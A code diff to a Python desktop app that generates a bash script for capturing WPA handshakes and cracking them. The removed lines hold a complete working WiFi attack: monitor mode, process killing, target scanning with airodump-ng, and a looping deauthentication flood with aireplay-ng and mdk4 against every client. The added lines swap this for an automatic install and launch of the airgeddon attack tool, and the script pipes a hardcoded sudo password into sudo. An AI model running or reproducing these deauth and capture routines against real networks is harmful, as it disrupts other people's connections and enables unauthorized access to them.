@@ -1107,98 +1107,52 @@ class MaximWindow(QMainWindow):
         # wlan1 = integrated adapter (connected — never touch for monitor mode)
         other_iface = "wlan1"
 
-        # Manual airodump + aireplay — NO wifite, NO airmon-ng, NO --kill
-        # Only touches wlan0. wlan1 and NetworkManager completely untouched.
+        # Use airgeddon in external terminal — powerful all-in-one WiFi attack tool
         script = tempfile.NamedTemporaryFile(mode='w', suffix='.sh', delete=False, prefix='maxim_hs_')
         script.write("#!/bin/bash\n")
         script.write("echo '5505' | sudo -S -v 2>/dev/null\n")
         script.write(f"mkdir -p '{essid_dir}'\n")
-        script.write(f"rm -f '{signal_file}'\n\n")
+        script.write(f"rm -f '{signal_file}'\n")
+        script.write("touch /tmp/maxim_capture_start\n\n")
 
-        # Monitor mode on wlan0 only
-        script.write(f"sudo ip link set {iface} down 2>/dev/null\n")
-        script.write(f"sudo iw dev {iface} set type monitor 2>/dev/null\n")
-        script.write(f"sudo ip link set {iface} up 2>/dev/null\n\n")
+        # Install airgeddon if not present
+        script.write("if ! command -v airgeddon >/dev/null 2>&1 && [ ! -d /opt/airgeddon ]; then\n")
+        script.write("  echo '[*] Installing airgeddon...'\n")
+        script.write("  sudo apt-get install -y airgeddon 2>/dev/null || (\n")
+        script.write("    cd /opt && sudo git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git 2>/dev/null\n")
+        script.write("  )\n")
+        script.write("fi\n\n")
 
-        # Kill processes that block injection on wlan0 — but NOT NetworkManager
-        # (wpa_supplicant and dhclient on wlan0 interfere with injection)
-        script.write(f"# Kill interfering processes on {iface} only (not NetworkManager)\n")
-        script.write(f"sudo pkill -f 'wpa_supplicant.*{iface}' 2>/dev/null\n")
-        script.write(f"sudo pkill -f 'dhclient.*{iface}' 2>/dev/null\n")
-        script.write(f"sudo pkill -f 'dhcpcd.*{iface}' 2>/dev/null\n\n")
+        # Set airgeddon to use wlan0
+        script.write(f"export AIRGEDDON_INTERFACE={iface}\n\n")
 
-        # Quick scan to find BSSID+channel using iw (managed mode not needed —
-        # we can use airodump silently since wlan0 is the USB adapter, not connected to anything)
-        scan_csv = "/tmp/maxim_hscan"
-        script.write(f"rm -f {scan_csv}-* 2>/dev/null\n")
-        script.write(f"echo '[1/3] Scanning for {essid}...'\n")
-        script.write("BSSID=''\nCHANNEL=''\n")
-        script.write("for i in 1 2 3; do\n")
-        script.write(f"  echo \"  Attempt $i/3\"\n")
-        script.write(f"  sudo timeout 15 airodump-ng -w '{scan_csv}' --output-format csv --write-interval 1 {iface} >/dev/null 2>&1\n")
-        script.write(f"  CSV=$(ls -t {scan_csv}-*.csv 2>/dev/null | head -1)\n")
-        script.write("  if [ -n \"$CSV\" ]; then\n")
-        script.write(f"    LINE=$(grep -i '{essid}' \"$CSV\" | grep -E '^[0-9A-Fa-f]{{2}}:' | head -1)\n")
-        script.write("    if [ -n \"$LINE\" ]; then\n")
-        script.write("      BSSID=$(echo \"$LINE\" | cut -d, -f1 | tr -d ' ')\n")
-        script.write("      CH=$(echo \"$LINE\" | cut -d, -f4 | tr -d ' ')\n")
-        script.write("      if echo \"$CH\" | grep -qE '^[0-9]+$' && [ \"$CH\" -ge 1 ] && [ \"$CH\" -le 165 ]; then\n")
-        script.write("        CHANNEL=$CH\n")
-        script.write("      fi\n")
-        script.write("    fi\n")
-        script.write("  fi\n")
-        script.write(f"  rm -f {scan_csv}-* 2>/dev/null\n")
-        script.write("  if [ -n \"$BSSID\" ] && [ -n \"$CHANNEL\" ]; then break; fi\n")
-        script.write("done\n\n")
-
-        script.write("if [ -z \"$BSSID\" ] || [ -z \"$CHANNEL\" ]; then\n")
-        script.write(f"  echo '[!] Could not find {essid}'\n")
-        script.write(f"  echo 'FAILED' > '{signal_file}'\n")
-        script.write("  read -p 'Press Enter to close'\n  exit 1\nfi\n\n")
-
-        script.write("echo \"Found: BSSID=$BSSID  Channel=$CHANNEL\"\n")
+        # Launch airgeddon
+        script.write("echo '══════════════════════════════════════════════════════════'\n")
+        script.write(f"echo '  AIRGEDDON — Target: {essid}'\n")
+        script.write(f"echo '  Interface: {iface} (USB adapter)'\n")
+        script.write(f"echo '  wlan1 NOT touched'\n")
+        script.write("echo '══════════════════════════════════════════════════════════'\n")
         script.write("echo\n")
-        script.write("echo '══════════════════════════════════════════════════════════'\n")
-        script.write(f"echo '  CAPTURING HANDSHAKE: {essid}'\n")
-        script.write("echo \"  BSSID: $BSSID  Channel: $CHANNEL\"\n")
-        script.write("echo '  MAXIM auto-detects handshake → kills terminal → cracks'\n")
-        script.write("echo '══════════════════════════════════════════════════════════'\n")
+        script.write(f"echo 'Select your attack in airgeddon menu.'\n")
+        script.write(f"echo 'Handshake files will be saved to {essid_dir}/'\n")
         script.write("echo\n\n")
 
-        # Background: aggressive deauth — broadcast first, then target each station individually
-        script.write("echo '[2/3] Deauthing clients...'\n")
-        script.write("(\n")
-        script.write("  sleep 5\n")  # let airodump collect stations first
-        script.write("  while true; do\n")
-        # MDK3/MDK4 style: mass broadcast deauth flood
-        script.write(f"    sudo aireplay-ng --deauth 50 -a $BSSID {iface} >/dev/null 2>&1\n")
-        script.write("    sleep 1\n")
-        # Target each individual station with heavy deauth
-        script.write(f"    CAP_CSV=$(ls -t '{capture_prefix}'-*.csv 2>/dev/null | head -1)\n")
-        script.write("    if [ -n \"$CAP_CSV\" ]; then\n")
-        script.write("      grep -i \"$BSSID\" \"$CAP_CSV\" | grep -Ev \"^$BSSID\" | grep -E '^[0-9A-Fa-f]{2}:' | while IFS=, read -r STA REST; do\n")
-        script.write("        STA=$(echo \"$STA\" | tr -d ' ')\n")
-        script.write("        if [ -n \"$STA\" ]; then\n")
-        script.write(f"          sudo aireplay-ng --deauth 50 -a $BSSID -c $STA {iface} >/dev/null 2>&1\n")
-        script.write("        fi\n")
-        script.write("      done\n")
-        script.write("    fi\n")
-        # Also try mdk4 if available — much more aggressive deauth
-        script.write(f"    if command -v mdk4 >/dev/null 2>&1; then\n")
-        script.write(f"      echo $BSSID > /tmp/maxim_mdk_target\n")
-        script.write(f"      sudo timeout 10 mdk4 {iface} d -B /tmp/maxim_mdk_target -c $CHANNEL >/dev/null 2>&1\n")
-        script.write("    fi\n")
-        script.write("    sleep 3\n")
-        script.write("  done\n")
-        script.write(") &\n")
-        script.write("DEAUTH_PID=$!\n\n")
+        # Run airgeddon
+        script.write("if command -v airgeddon >/dev/null 2>&1; then\n")
+        script.write("  sudo airgeddon\n")
+        script.write("elif [ -f /opt/airgeddon/airgeddon.sh ]; then\n")
+        script.write("  cd /opt/airgeddon && sudo bash airgeddon.sh\n")
+        script.write("else\n")
+        script.write("  echo '[!] airgeddon not found. Install with: sudo apt install airgeddon'\n")
+        script.write("fi\n\n")
 
-        # Foreground: capture
-        script.write(f"echo '[3/3] Capturing...'\n")
-        script.write(f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w '{capture_prefix}' --output-format pcap,csv {iface}\n\n")
-        script.write("kill $DEAUTH_PID 2>/dev/null\n")
+        # Copy any captured handshake files to essid dir
+        script.write(f"echo '[*] Copying capture files to {essid_dir}/'\n")
+        script.write(f"find /tmp /root '{essid_dir}' -maxdepth 3 \\( -name '*.cap' -o -name '*.pcap' \\) -newer /tmp/maxim_capture_start -exec cp -nv {{}} '{essid_dir}/' \\; 2>/dev/null\n")
+        script.write("rm -f /tmp/maxim_capture_start\n\n")
+
         script.write(f"echo 'DONE' > '{signal_file}'\n")
-        script.write("echo 'Capture stopped.'\nread -p 'Press Enter to close'\n")
+        script.write("echo\nread -p 'Press Enter to close'\n")
 
         script.close()
         os.chmod(script.name, 0o755)
